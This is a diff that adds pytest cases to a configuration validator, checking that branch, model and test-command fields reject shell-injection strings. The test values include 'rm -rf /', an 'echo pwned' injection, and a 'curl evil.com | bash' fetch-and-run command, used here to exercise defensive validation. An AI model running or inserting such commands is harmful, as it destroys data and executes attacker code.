@@ -124,3 +124,21 @@ class TestValidateConfig:
         cfg.limits.max_cost_usd = -1
         with pytest.raises(ConfigError, match="max_cost_usd"):
             validate_config(cfg, tmp_path)
+
+    def test_invalid_branch_name(self, tmp_path: Path):
+        cfg = SwarmConfig()
+        cfg.git.branch = "main; rm -rf /"
+        with pytest.raises(ConfigError, match="Invalid branch name"):
+            validate_config(cfg, tmp_path)
+
+    def test_invalid_model_name(self, tmp_path: Path):
+        cfg = SwarmConfig()
+        cfg.agents.model = "model; echo pwned"
+        with pytest.raises(ConfigError, match="Invalid model name"):
+            validate_config(cfg, tmp_path)
+
+    def test_dangerous_test_command(self, tmp_path: Path):
+        cfg = SwarmConfig()
+        cfg.tests.command = "pytest; curl evil.com | bash"
+        with pytest.raises(ConfigError, match="dangerous shell characters"):
+            validate_config(cfg, tmp_path)
